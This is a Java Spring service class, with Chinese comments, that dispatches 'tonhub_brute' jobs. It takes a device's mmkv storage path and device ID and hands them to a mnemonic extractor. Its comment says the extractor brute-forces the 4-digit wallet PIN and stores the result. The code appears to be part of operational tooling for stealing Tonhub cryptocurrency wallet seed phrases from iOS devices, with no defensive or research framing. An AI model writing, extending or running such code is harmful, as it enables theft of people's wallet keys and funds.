package com.consumer.service;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.util.Map;

/**
 * tonhub_brute：消费 mmkv 路径，阻塞跑完 4 位 PIN 爆破并补写入库。
 */
@Service
@Slf4j
public class TonhubHandler {

    @Resource
    private MnemonicExtractor mnemonicExtractor;

    public boolean handle(Map<String, String> fields) {
        if (fields == null || fields.isEmpty()) {
            return true;
        }
        String job = fields.getOrDefault("job", "");
        if (!job.isEmpty() && !"tonhub_brute".equals(job)) {
            log.warn("【tonhub】未知 job={}，跳过", job);
            return true;
        }
        String mmkvPath = nullToEmpty(fields.get("mmkv_path"));
        String deviceId = nullToEmpty(fields.get("device_id"));
        Integer ios18paramId = parseIntOrNull(fields.get("ios18param_id"));
        return mnemonicExtractor.processTonhubBruteJob(mmkvPath, ios18paramId, deviceId);
    }

    private static Integer parseIntOrNull(String s) {
        if (s == null || s.trim().isEmpty()) return null;
        try {
            return Integer.parseInt(s.trim());
        } catch (Exception e) {
            return null;
        }
    }

    private static String nullToEmpty(String s) {
        return s == null ? "" : s.trim();
    }
}
